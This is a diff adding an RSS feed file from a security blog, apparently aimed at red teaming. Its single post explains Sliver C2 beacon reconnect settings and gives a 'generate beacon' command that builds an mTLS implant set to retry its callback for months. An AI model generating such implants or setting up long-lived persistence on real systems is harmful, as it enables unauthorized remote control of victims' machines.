@@ -1,0 +1,40 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Config on Ca1s1&#39;Blog</title>
+    <link>https://vuln.top/tags/config/</link>
+    <description>Recent content in Config on Ca1s1&#39;Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 22 Feb 2025 15:32:38 +0800</lastBuildDate><atom:link href="https://vuln.top/tags/config/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Sliver服务端口丢失客户端自动断开</title>
+      <link>https://vuln.top/posts/sliver-reconnect/</link>
+      <pubDate>Sat, 22 Feb 2025 15:32:38 +0800</pubDate>
+      
+      <guid>https://vuln.top/posts/sliver-reconnect/</guid>
+      <description>&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;sliver&lt;/strong&gt;  &lt;em&gt;&amp;ndash;max-errors&lt;/em&gt;值为 1000，&lt;em&gt;&amp;ndash;reconnect&lt;/em&gt;设置为 60 秒；这意味着如果之前的连接失败，植入物应该每 60 秒尝试重新连接一次，最多 1000 次，大约 16 小时。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;虽然不能关闭&lt;em&gt;max-errors&lt;/em&gt;，但是可以设置一个超大值接近于无限期。&lt;/p&gt;
+&lt;p&gt;这是reconnect为12个小时，理论上可以重新尝试250天
+&lt;code&gt;generate beacon --mtls 0.0.0.0:4444 --os linux --arch amd64 --save /tmp/ --hours 4 --jitter 3 --reconnect 43200&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;参考：
+&lt;a href=&#34;https://github.com/BishopFox/sliver/issues/1253&#34;&gt;https://github.com/BishopFox/sliver/issues/1253&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;</description>
+      <content>&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;sliver&lt;/strong&gt;  &lt;em&gt;&amp;ndash;max-errors&lt;/em&gt;值为 1000，&lt;em&gt;&amp;ndash;reconnect&lt;/em&gt;设置为 60 秒；这意味着如果之前的连接失败，植入物应该每 60 秒尝试重新连接一次，最多 1000 次，大约 16 小时。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;虽然不能关闭&lt;em&gt;max-errors&lt;/em&gt;，但是可以设置一个超大值接近于无限期。&lt;/p&gt;
+&lt;p&gt;这是reconnect为12个小时，理论上可以重新尝试250天
+&lt;code&gt;generate beacon --mtls 0.0.0.0:4444 --os linux --arch amd64 --save /tmp/ --hours 4 --jitter 3 --reconnect 43200&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;参考：
+&lt;a href=&#34;https://github.com/BishopFox/sliver/issues/1253&#34;&gt;https://github.com/BishopFox/sliver/issues/1253&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
